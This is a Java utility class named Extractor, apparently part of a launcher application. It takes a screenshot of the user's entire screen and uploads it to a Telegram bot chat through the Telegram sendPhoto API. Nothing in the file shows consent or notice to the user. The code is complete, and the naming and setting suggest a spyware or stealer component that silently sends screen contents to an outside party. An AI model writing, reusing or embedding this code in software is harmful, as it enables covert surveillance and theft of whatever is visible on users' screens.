package Utils;

import Config.ConfigManager;
import Config.LauncherConfig;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class Extractor {
    private static final LauncherConfig config = ConfigManager.loadConfig();


    public static byte[] captureScreenshot() throws AWTException, IOException {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenshot = robot.createScreenCapture(screenRect);

        try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
            ImageIO.write(screenshot, "png", baos);
            return baos.toByteArray();
        }
    }

    public static void sendPhotoWithCaption(byte[] imageBytes,
                                            String caption,
                                            String botToken,
                                            String chatId) throws IOException {
        String boundary = "------------------------" + System.currentTimeMillis();
        HttpURLConnection connection = prepareConnection(botToken, boundary);

        try (OutputStream outputStream = connection.getOutputStream();
             PrintWriter writer = new PrintWriter(
                     new OutputStreamWriter(outputStream, StandardCharsets.UTF_8), true)) {

            sendFormData(writer, boundary, chatId, caption);
            outputStream.write(imageBytes);
            finishRequest(writer, boundary);
        }

        handleServerResponse(connection);
    }

    private static HttpURLConnection prepareConnection(String botToken, String boundary)
            throws IOException {
        String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty(
                "Content-Type",
                "multipart/form-data; boundary=" + boundary
        );

        return connection;
    }

    private static void sendFormData(PrintWriter writer,
                                     String boundary,
                                     String chatId,
                                     String caption) {
        writer.append("--").append(boundary).append("\r\n");
        writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
        writer.append(chatId).append("\r\n").flush();

        writer.append("--").append(boundary).append("\r\n");
        writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
        writer.append(caption).append("\r\n").flush();

        writer.append("--").append(boundary).append("\r\n");
        writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n");
        writer.append("Content-Type: image/png\r\n\r\n");
        writer.flush();
    }

    private static void finishRequest(PrintWriter writer, String boundary) {
        writer.append("\r\n").flush();
        writer.append("--").append(boundary).append("--\r\n").flush();
    }

    private static void handleServerResponse(HttpURLConnection connection) throws IOException {
        int responseCode = connection.getResponseCode();
        if (responseCode != HttpURLConnection.HTTP_OK) {
            throw new IOException("Ошибка сервера: " + responseCode + " - " + connection.getResponseMessage());
        }
        logSuccess(connection);
    }

    private static void logSuccess(HttpURLConnection connection) {
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8)
        )) {
            if (config.isDebugMode()) {
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    System.out.println("Ответ сервера: " + responseLine);
                }
            }
        } catch (IOException e) {
            System.err.println("Ошибка чтения ответа: " + e.getMessage());
        }
    }
}